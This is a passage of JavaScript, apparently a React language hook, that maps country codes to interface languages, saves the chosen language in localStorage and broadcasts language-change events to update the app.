        'gt': 'es',
        'cu': 'es',
        'bo': 'es',
        'do': 'es',
        'hn': 'es',
        'py': 'es',
        'sv': 'es',
        'ni': 'es',
        'cr': 'es',
        'pr': 'es',
        'uy': 'es',
        
        // Czech
        'cz': 'cz',
        'sk': 'cz',
      };
      
      const detectedLang = countryToLanguage[countryCode] || 'en';
      setLanguage(detectedLang);
      localStorage.setItem('appLanguage', detectedLang);
      
      const langNames = {
        'da': '🇩🇰 Danish',
        'de': '🇩🇪 German',
        'fr': '🇫🇷 French',
        'es': '🇪🇸 Spanish',
        'cz': '🇨🇿 Czech',
        'en': '🇬🇧 English'
      };
      
      console.log(`🎯 IP DETECTION: ${langNames[detectedLang]} for country ${countryCode.toUpperCase()}`);
    };

    detectByIPOnly();
  }, []);

  const toggleLanguage = (lang) => {
    setLanguage(lang);
    localStorage.setItem('appLanguage', lang);
    window.dispatchEvent(new CustomEvent('languageChange', { detail: lang }));
  };

  useEffect(() => {
    const handleLanguageChange = (event) => {
      setLanguage(event.detail);
    };
    window.addEventListener('languageChange', handleLanguageChange);
    return () => window.removeEventListener('languageChange', handleLanguageChange);
  }, []);

  return { language, toggleLanguage, t: translations[language] };
};